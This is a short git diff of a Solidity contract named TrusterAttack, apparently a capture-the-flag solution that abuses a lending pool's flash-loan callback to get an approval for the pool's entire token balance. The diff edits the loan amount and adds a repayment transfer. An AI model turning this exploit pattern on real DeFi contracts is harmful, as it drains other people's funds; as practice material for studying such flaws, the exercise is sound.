@@ -31,8 +31,10 @@ contract TrusterAttack {
         attacker = attackerAddress;
         balance = token.balanceOf(pool);
 
+
+        uint256 transferAmount = 1;
         IPoolFunc(pool).flashLoan(
-            0,
+            1,
             address(this),
             tokenAddress,
             abi.encodeWithSignature(
@@ -41,6 +43,7 @@ contract TrusterAttack {
                 balance
             )
         );
+        token.transfer(pool, transferAmount);
         //IERC20(tokenAddress).transfer(attackerAddress, balance);
         //calldata = approve(pool, this)
         //response 
